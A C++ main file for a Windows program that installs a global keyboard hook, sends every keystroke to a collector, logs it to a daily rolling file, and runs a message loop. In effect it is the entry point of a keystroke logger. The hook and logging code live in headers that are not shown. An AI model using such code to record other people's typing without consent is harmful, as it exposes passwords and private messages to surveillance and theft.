#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>

#include "date_time.hpp"
#include "logger.hpp"
#include "key_input_collector.hpp"
#include "keyboard_hook.hpp"

using namespace zuu;

int main() {
    std::ios_base::sync_with_stdio(false);

	DateTime dt;
    Logger logger;
    logger.open();

    KeyInputCollector collector(logger);
    collector.initialize();

    if (collector.hasStatus(KeyInputCollector::Status::Error)) {
        return 1;
    }

    bool shouldExit = false;
    KeyboardHook hook(collector, [&shouldExit]() {
        shouldExit = true;
        PostQuitMessage(0);
    });

    if (!hook.install()) {
		dt.now();
        logger.write(dt.datetime(), "Error", "Failed to install hook: " + std::to_string(GetLastError()));
        collector.close();
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        collector.rolloverIfNewDay();

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    hook.uninstall();
    collector.close();

    return 0;
}